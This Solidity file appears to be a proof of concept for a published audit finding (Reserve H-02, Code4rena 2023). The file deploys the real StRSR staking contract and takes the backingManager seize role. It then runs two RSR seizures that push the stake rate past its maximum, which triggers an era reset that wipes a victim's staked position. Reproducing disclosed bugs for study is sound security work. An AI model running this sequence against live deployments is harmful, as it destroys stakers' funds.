// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Real-source reproduction of Reserve H-02 (Code4rena 2023-06, commit c4ec2473) for the
// in-browser EVM Playground. No cheatcodes: the Exploit contract deploys the REAL
// StRSRP1Votes and plays the backingManager (the only role allowed to seize RSR). A genuine
// third-party Staker (the victim) stakes RSR; a mere 10% follow-on seizure pushes the stake
// rate over MAX_STAKE_RATE, triggering beginEra() which wipes the victim's large position.
import "../src/reserve/target/p1/StRSRVotes.sol";
import "../src/reserve/target/interfaces/IMain.sol";
import "../src/reserve/target/poc/PoCEnv.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit {
    StRSRP1Votes public stRSR;
    MiniRSR public rsr;
    PoCMain32 public main;
    Staker public victim;

    uint256 public victimStakeBefore;
    uint256 public victimStakeAfter;
    uint256 public eraBefore;
    uint256 public eraAfter;
    bool public proven;

    constructor() {
        rsr = new MiniRSR();
        // This Exploit contract is the backingManager (the only address allowed to seize).
        main = new PoCMain32(IERC20(address(rsr)), address(this));

        StRSRP1Votes impl = new StRSRP1Votes();
        bytes memory initData = abi.encodeWithSignature(
            "init(address,string,string,uint48,uint192,uint192)",
            address(main),
            "Staked RSR",
            "stRSR",
            uint48(1209600), // unstakingDelay
            uint192(0), // rewardRatio
            uint192(0) // withdrawalLeak
        );
        stRSR = StRSRP1Votes(address(new ERC1967Proxy(address(impl), initData)));

        victim = new Staker();
        rsr.mint(address(victim), 2 ether);
    }

    function run() external {
        eraBefore = stRSR.currentEra();

        // The victim stakes 1 RSR (1e18 stRSR at rate 1.0).
        victim.approveAndStake(IERC20(address(rsr)), address(stRSR), 1 ether);

        // A large seizure leaves the pool barely solvent: stakeRate rises to ~9.52e26,
        // just under MAX_STAKE_RATE (1e27). No era reset yet.
        stRSR.seizeRSR(1 ether - 1_050_000_000);

        // Normal usage resumes: staking 1 more RSR now mints ~9.52e26 stRSR, a large position.
        victim.approveAndStake(IERC20(address(rsr)), address(stRSR), 1 ether);
        victimStakeBefore = stRSR.balanceOf(address(victim));
        require(victimStakeBefore > 1e26, "victim should hold a large position");

        // A mere 10% follow-on seizure crosses MAX_STAKE_RATE -> the REAL beginEra() fires.
        uint256 secondSeizure = rsr.balanceOf(address(stRSR)) / 10;
        stRSR.seizeRSR(secondSeizure);

        // Harm: the victim's large position is wiped despite ~90% of value still present.
        victimStakeAfter = stRSR.balanceOf(address(victim));
        eraAfter = stRSR.currentEra();

        proven =
            eraAfter > eraBefore &&
            stRSR.totalSupply() == 0 &&
            victimStakeAfter == 0 &&
            victimStakeBefore > 1e26;
        require(proven, "era-reset wipe not demonstrated");
    }
}
